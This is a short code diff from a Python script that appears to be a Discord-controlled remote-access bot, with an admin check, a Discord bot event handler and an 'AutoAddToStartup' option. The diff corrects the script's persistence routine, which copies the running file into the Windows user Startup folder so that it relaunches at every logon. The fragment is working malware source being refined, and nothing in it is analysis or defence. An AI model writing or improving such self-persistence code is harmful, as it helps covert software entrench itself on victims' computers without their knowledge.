@@ -122,11 +122,10 @@ def IsAdmin():
 
 # // Startup
 if AutoAddToStartup == True: 
-    FileName = sys.argv[0]
-    if os.path.exists(Appdata + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\' + FileName):
+    if os.path.exists(Appdata + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\' + os.path.basename(sys.argv[0])):
         pass 
     else:
-        shutil.copy(sys.argv[0], Appdata + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\' + os.path.basename(sys.argv[0]))
+        shutil.copy(sys.argv[0], Appdata + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\')
 
 # // Main
 @Bot.event
